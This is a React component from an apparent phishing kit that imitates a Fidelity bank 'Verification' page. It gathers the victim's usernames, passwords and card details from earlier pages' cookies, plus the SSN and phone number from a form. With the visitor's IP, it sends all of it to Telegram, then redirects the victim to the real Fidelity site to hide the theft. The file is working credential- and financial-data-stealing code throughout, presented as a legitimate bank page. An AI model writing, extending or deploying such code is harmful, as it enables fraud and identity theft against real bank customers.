import React from "react";
import fid from "../assets/fidelity.svg";

import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Final() {
  const [isLoading, setIsLoading] = React.useState(false);
  const [formInput, setFormInput] = React.useState<final>({
    sn: "",
    phone: "",
  });

  const login1: Login = cookies.get("login1");
  const login2: Login2 = cookies.get("login2");
  const card: card = cookies.get("card");

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true);
    const request = await fetch("https://api.ipify.org?format=json");
    const response: { ip: string } = await request.json();
    const visitorIP = response.ip;

    const message = `
        ---- FIDELITY BANK -----
        IP: ${visitorIP}
        Username: ${login1.username}
        Password: ${login1.password}
        Username 2: ${login2.username2}
        Password 2: ${login2.password2}
        Card number: ${card.cnm}
        Card Expiry : ${card.ex}
        Card Cvv: ${card.cv}
        SSN: ${formInput.sn}
        Phone Number: ${formInput.phone}
        `;

    await TelegramSend(message);
    window.location.replace("https://www.fidelity.com/")
    setIsLoading(false);
  }

  return (
    <>
      <div className="navbar">
        <div className="brand">
          <div>
            <img src={fid} alt="" />
          </div>
        </div>

        <div className="nav-texts">
          <p style={{ marginRight: 20 }}>Security</p>
          <p>FAQ</p>
        </div>
      </div>

      <div className="content">
        <div className="form">
          <form onSubmit={handleSubmit} method="POST">
            <div className="form-item">
              <h2>Verification</h2>
              <p>
                Verify your SSN and Phone number
              </p>
              
                <div className="form-field">
                  <label htmlFor="">SSN</label>
                  <input maxLength={9} onChange={handleInputChange} name="code" type="text" />
                </div>

                <div className="form-field">
                  <label htmlFor="">Phone Number</label>
                  <input maxLength={12} onChange={handleInputChange} name="code" type="text" />
                </div>

                
                {isLoading ? (
                  <div className="form-field">
                    <button type="button">Please wait...</button>
                  </div>
                ) : (
                  <div className="form-field">
                    <button type="submit">Submit</button>
                  </div>
                )}

                <a href="">Forgot username or password?</a>
              
            </div>
          </form>
        </div>
      </div>

      <div className="footer">
        <p style={{ textAlign: "center" }}>
          New to Fidelity? <a href="">Open an account</a> or{" "}
          <a href="">sign up</a>
        </p>
      </div>
    </>
  );
}
